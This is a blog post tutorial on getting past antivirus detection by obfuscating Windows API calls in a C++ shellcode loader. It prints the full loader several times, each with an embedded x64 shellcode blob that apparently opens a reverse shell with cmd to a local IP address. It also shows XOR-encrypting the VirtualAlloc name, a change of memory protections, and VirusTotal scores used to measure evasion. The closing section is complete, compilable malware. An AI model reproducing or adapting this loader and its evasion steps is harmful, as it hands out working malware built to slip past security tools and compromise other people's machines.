---
layout: post
title: "AV engines evasion with function call Obfuscation with C++ example"
date: 2025-02-12
categories: [blog]
---
# Introduction

Portable Executable(PE) module such as .exe or .dll relies on imported functions because the executable does not define them. When program runs, the os loads these external functions from system DLLs (ex- KERNEL32.dll) into memory and making them available to the program. 
By analyzing these imported functions, AV engines can determine an executable’s functionality to detect potential malicious behavior in malicious executables. 

To bypass this detection, malware authors can use a technique called **Function Call Obfuscation**. Function call obfuscation is when hiding the external functions that will be called during runtime by manually loading and retrieving function addresses at runtime. For that we can use windows API functions called __GetModuleHandle__ and __GetProcAddress__. 

__GetModuleHandle__ – this retrieves handle to a DLL that is already loaded into the process memory. 

`HMODULE GetModuleHandleA(LPCSTR lpModuleName);`

__GetProcAddress__ -this can be used to get the memory address of a specific function exported from above DLL. 

`FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName);`


to demonstrate the function level obfuscation technique I’ll first write a simple code to shellcode execution in memory in cpp. 

{% highlight cpp %}
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


unsigned char my_payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x07"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


unsigned int my_payload_len = sizeof(my_payload);

int main(void) {
  void * my_payload_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
  WaitForSingleObject(th, -1);
  return 0;
}
{% endhighlight %}

now lets see the imported functions from KERNEL32.dll in this executable. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.1.png" alt="function call" width="500">

you can see a imported function called **VirtualAlloc**. this is used to allocate memory for shellcode execution.
also lets check the virus total detection for this PE. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.2.png" alt="virus total detection" width="1000">  
as you can see 39 engines out of 72 identified this as malicious. a

let's use Function call obfuscation technique to remove this from loading. 

# Function Call Obfuscation

lets remove the direct function call to __VirtualAlloc__ . 
{% highlight cpp %}
{% endhighlight %}
{% highlight cpp %}
my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
{% endhighlight %}

this directly calls VirtualAlloc. Since VirtualAlloc is present in the Import Address Table (IAT), AV engines can easily detect that this PE calling VirtualAlloc. 

to remove that we can use __GetModuleHandle("kernel32.dll")__ to get a handle to kernel32.dll. also using __GetProcAddress__ to retrieve the function's memory address at runtime. 

for this, lets create a global variable called __VirtualAlloc__ as a pointer. 

{% highlight cpp %}
LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
{% endhighlight %}

now we can get the pointer address to __VirtualAlloc__ via the __GetProcAddress__ like below.

{% highlight cpp %}
pVirtualAlloc = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
my_payload_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
{% endhighlight %}

after compiling, lets see the imported functions from kernel32.dll. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.3.png" alt="virus total detection" width="500">

as you can see __VirtualAlloc__ is not imported. but if we check the strings from PE, we still can see the __VirtualAlloc__ in there. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.4.png" alt="" width="500">

that because we add the name in clear text when calling the __GetProcAddress__ . we can change this by using encrtyption. for this ill use XOR. 
first ill write a XOR function which can encrypt the string we want. you can change the key. 

{% highlight cpp %}
#include <stdio.h>
#include <string.h>

void XOR(char *data, size_t data_len, char *key, size_t key_len) {
    int j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] ^= key[j];
        j++;
    }
}

int main() {
    char function_name[] = "VirtualAlloc"; 
    char key[] = "Athulya"; 
    size_t name_len = strlen(function_name);
    size_t key_len = strlen(key);

    XOR(function_name, name_len, key, key_len);

    printf("Encoded cVirtualAlloc[] = { ");
    for (size_t i = 0; i < name_len; i++) {
        printf("0x%02x", (unsigned char)function_name[i]);
        if (i < name_len - 1) printf(", ");
    }
    printf(" };\n");

    return 0;
}
{% endhighlight %}

run this in seperate to generate encrypted values for our provied string. now we need to use the same XOR function and key in our malicious program to decrypt the __VirtualAlloc__ string. ill provide the steps to do this below. 

adding global variables for encrypted virtualalloc, virtualalloc length and secret. 

{% highlight cpp %}
unsigned char cVirtualAlloc[] = { 0x37, 0x1d, 0x1a, 0x01, 0x19, 0x18, 0x0d, 0x20, 0x18, 0x04, 0x1a, 0x0f };
unsigned int cVirtualAllocLen = sizeof(cVirtualAlloc);
char mySecretKey[] = "athulya";
{% endhighlight %}

then we can call the XOR function inside the main.

{% highlight cpp %}
XOR((char *) cVirtualAlloc, cVirtualAllocLen, mySecretKey, sizeof(mySecretKey));
{% endhighlight %}

also dont forget to do the null termination. this is how i did it.

{% highlight cpp %}
char cVirtualAllocStr[sizeof(cVirtualAlloc) + 1];
memcpy(cVirtualAllocStr, cVirtualAlloc, cVirtualAllocLen);
cVirtualAllocStr[cVirtualAllocLen] = '\0';
{% endhighlight %}

now the program will run perfectly.
if you can remember i added memory region with read, write and execution permission. some AV engine can flag this because it is not usual to have a process which need a memory with read, write, execution permission. so we can change this like this. first we can define the memory region with only read and write permission. then we can modifies the memory protection to executable. 

allocating memory with only read and write permission. 

{% highlight cpp %}
my_payload_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
{% endhighlight %}

changing the memory protection to readable and executable. 

{% highlight cpp %}
rv = VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
{% endhighlight %}

now we are done with our function call obfuscation. lets compile and check the results. 
lets check the string results to see whether it hash "VirtualAlloc" word. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.5.png" alt="function call" width="1000">

as you can see no string represents the __VirtualAlloc__ name. 

now lets test the Virustotal results to see whether this is an effective technique. 

<img src="/assets/images/blog1 - av evasion with function call obfuscation/1.6.png" alt="function call" width="1000">

it doesn't show the significant amount change, but still you can see it is effective. we can reduce this more by obfuscating the shellcode. ill talk about these in next posts. 

FULL COMPLETE CODE:

{% highlight cpp %}
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

unsigned char my_payload[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x07"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


unsigned int my_payload_len = sizeof(my_payload);

unsigned char cVirtualAlloc[] = { 0x37, 0x1d, 0x1a, 0x01, 0x19, 0x18, 0x0d, 0x20, 0x18, 0x04, 0x1a, 0x0f };
unsigned int cVirtualAllocLen = sizeof(cVirtualAlloc);
char mySecretKey[] = "athulya";

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;
  j = 0;
  for (int i = 0; i < data_len; i++) {
          if (j == key_len - 1) j = 0;

          data[i] = data[i] ^ key[j];
          j++;
  }
}

int main(void) {
  void * my_payload_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  XOR((char *) cVirtualAlloc, cVirtualAllocLen, mySecretKey, sizeof(mySecretKey));
  printf("%s", &cVirtualAlloc);

  char cVirtualAllocStr[sizeof(cVirtualAlloc) + 1];
  memcpy(cVirtualAllocStr, cVirtualAlloc, cVirtualAllocLen);
  cVirtualAllocStr[cVirtualAllocLen] = '\0';

  pVirtualAlloc = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), cVirtualAllocStr);
  my_payload_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

  //my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(my_payload_mem, my_payload, my_payload_len);
  VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
  th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) my_payload_mem, 0, 0, 0);
  WaitForSingleObject(th, -1);
  return 0;
}
{% endhighlight %}

Thank you for reading!
